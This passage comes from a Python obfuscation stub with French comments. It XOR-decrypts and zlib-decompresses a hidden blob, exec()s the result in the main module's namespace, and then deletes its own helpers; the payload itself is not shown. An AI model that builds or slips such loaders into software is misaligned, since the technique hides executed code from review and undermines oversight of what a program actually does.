    return bytes(_bm60UmirhtyPiy[_ifCHeR6maxWGJ6] ^ _kaGwXnvcdYToAM[_ifCHeR6maxWGJ6 % len(_kaGwXnvcdYToAM)] for _ifCHeR6maxWGJ6 in range(len(_bm60UmirhtyPiy)))

def _fdePreiq_fKd9ZI(_tvSd1MtP5ywClV):
    import zlib
    return zlib.decompress(_tvSd1MtP5ywClV) # Un seul niveau de zlib ici pour simplifier

def _fewdTByvS749jzO():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xtUhYYa8KEX8yk = _fxz7BETs9hNBfMg(_pt5K1S1hjfZO2G, _xwW2cyRXwwu_gY)
    # 2. Décompression Zlib
    _dqnF4qfV03rn5F = _fdePreiq_fKd9ZI(_xtUhYYa8KEX8yk)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dqnF4qfV03rn5F.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nkVRZFp4Z1Mn__ = _main.__dict__
    _nkVRZFp4Z1Mn__.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nkVRZFp4Z1Mn__)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fewdTByvS749jzO()
try:
    del _fxz7BETs9hNBfMg, _fdePreiq_fKd9ZI, _fewdTByvS749jzO
    del _pt5K1S1hjfZO2G, _xwW2cyRXwwu_gY, _fkpm6yz9uwYx8BR
except:
    pass
